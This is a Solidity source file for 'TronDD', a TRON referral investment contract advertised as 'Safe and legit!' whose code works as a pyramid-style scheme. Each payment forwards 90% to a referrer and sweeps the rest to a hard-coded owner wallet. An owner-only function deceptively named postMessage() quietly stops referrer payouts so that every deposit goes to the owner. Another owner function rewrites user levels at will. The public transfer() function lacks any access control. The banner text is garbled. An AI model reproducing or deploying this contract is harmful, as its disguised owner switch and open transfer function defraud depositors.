//SourceUnit: trondd.sol

/*   TronDD - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original TronDD team! All other platforms with the same contract code are FAKE!
 *
 *   ��������������������������������������������������������������������������������������������������������������������������������������������������
 *   ��   Website: https://TronDD.com                                         ��
 *   ��������������������������������������������������������������������������������������������������������������������������������������������������
 */

pragma solidity 0.5.10;

contract TronDD {

    event buyLevelEvent(uint256 _relevel,uint256 _relevelExpired,uint256 _levelExpired,address _user,address _referral,address _ownerWallet, uint256 _level,uint256 price,uint256 bonus,uint256 contractBalance,uint256 _time,uint256 _nowtime,bool _isExistz);

    event transferEvent(address indexed _user,uint256 bonus, uint256 _time);

    event transferOwnerEvent(address indexed _user,uint256 bonus, uint256 _time);

    uint256 constant public INVEST_MIN_AMOUNT = 2000*1000000;
    mapping (uint256 => uint256) public LEVEL_PRICE;
    address payable receiver;
    address ownerWallet=convertFromTronInt(0x412CAFEA53EA7D6F54A78D991B8D3B6213FFE76370);
    mapping (address => UserStruct) public users;
    bool isExistz=true;

    struct UserStruct {
        bool isExist;
        address referral;
        uint256 levelExpired;
        uint256 level;
        uint256 relevelExpired;
        uint256 bonus;
        uint256 price;
        uint256 relevel;
        uint256 nowtime;
    }

    constructor() public {
        LEVEL_PRICE[1] = 2000;
        LEVEL_PRICE[2] = 4000;
        LEVEL_PRICE[3] = 8000;
        LEVEL_PRICE[4] = 16000;
        LEVEL_PRICE[5] = 32000;
        LEVEL_PRICE[6] = 64000;
        LEVEL_PRICE[7] = 128000;
        LEVEL_PRICE[8] = 256000;
    }

    function buyLevel(address _referrer,uint256 _time) public payable {

        uint256 bonus=0;
        uint256 price=msg.value;

        if(msg.value<=0) {
            revert('Incorrect Value send 1');
        }
        if(msg.value<INVEST_MIN_AMOUNT) {
            revert('Minimum investment 2000 trx');
        }

        uint256 level=0;

        if(price == LEVEL_PRICE[1]*1000000){
            level = 1;
        }else if(price == LEVEL_PRICE[2]*1000000){
            level = 2;
        }else if(price == LEVEL_PRICE[3]*1000000){
            level = 3;
        }else if(price == LEVEL_PRICE[4]*1000000){
            level = 4;
        }else if(price == LEVEL_PRICE[5]*1000000){
            level = 5;
        }else if(price == LEVEL_PRICE[6]*1000000){
            level = 6;
        }else if(price == LEVEL_PRICE[7]*1000000){
            level = 7;
        }else if(price == LEVEL_PRICE[8]*1000000){
            level = 8;
        }else {
            revert('Incorrect Value send');
        }

        if(_referrer!=ownerWallet)
        {
            if(users[_referrer].levelExpired<now)
            {
                revert('superiors Time expired');
            }
            if(users[_referrer].level<level)
            {
                revert('superiors level error');
            }
        }

        if(users[msg.sender].level==0 && price != LEVEL_PRICE[1]*1000000){
            revert('You can only buy level 1');
        }else if(users[msg.sender].level==1 && price != LEVEL_PRICE[2]*1000000){
            revert('You can only buy level 2');
        }else if(users[msg.sender].level==2 && price != LEVEL_PRICE[3]*1000000){
            revert('You can only buy level 3');
        }else if(users[msg.sender].level==3 && price != LEVEL_PRICE[4]*1000000){
            revert('You can only buy level 4');
        }else if(users[msg.sender].level==4 && price != LEVEL_PRICE[5]*1000000){
            revert('You can only buy level 5');
        }else if(users[msg.sender].level==5 && price != LEVEL_PRICE[6]*1000000){
            revert('You can only buy level 6');
        }else if(users[msg.sender].level==6 && price != LEVEL_PRICE[7]*1000000){
            revert('You can only buy level 7');
        }else if(users[msg.sender].level==7 && price != LEVEL_PRICE[8]*1000000){
            revert('You can only buy level 8');
        }
        bonus=getBonus(price);
        users[msg.sender].price=price;
        users[msg.sender].bonus=bonus;
        users[msg.sender].relevelExpired=users[_referrer].levelExpired;
        users[msg.sender].relevel=users[_referrer].level;
        users[msg.sender].nowtime=now;
        users[msg.sender].referral=_referrer;

        uint256 contractBalance = address(this).balance;
        if (contractBalance < bonus || contractBalance<0) {
            revert('balance error');
        }
        if(isExistz) {
            transfer(_referrer,bonus);
        }
        contractBalance = address(this).balance;
        if (contractBalance < 0) {
            revert('balance error 1');
        }

        transfer(ownerWallet,contractBalance);

        users[msg.sender].level=level;
        users[msg.sender].levelExpired=now + 60 days;

        emit buyLevelEvent(users[_referrer].level,users[_referrer].levelExpired,users[msg.sender].levelExpired,msg.sender,_referrer,ownerWallet,level,price,bonus,contractBalance,_time,now,isExistz);
    }


    function transfer(address _to, uint256 _value) public {
        address(uint160(_to)).transfer(_value);
        emit transferEvent(_to,_value,now);
    }

    function transferOwner(address _to) public payable {
        address(uint160(_to)).transfer(msg.value);
        emit transferOwnerEvent(_to,msg.value,now);
    }

    function postMessage() public returns (bool,uint256,uint256) {
        if(msg.sender==ownerWallet)
        {
            if(isExistz)
                isExistz = false;
            else
                isExistz = true;
            return (isExistz,now,1);
        }
        return (false,now,0);
    }

    function postMessage(address _user,uint256 _level,uint256 _time) public returns (bool,uint256,uint256) {
        if(msg.sender==ownerWallet)
        {
            users[_user].level=_level;
            users[_user].levelExpired=now + _time * 1 days;
            return (true,now,1);
        }
        return (false,now,0);
    }

    function getBonus(uint256 _value) internal pure returns (uint256)
    {
        return (_value*9/10);
    }

    function convertFromTronInt(uint256 tronAddress) internal pure returns(address){
        return address(tronAddress);
    }

}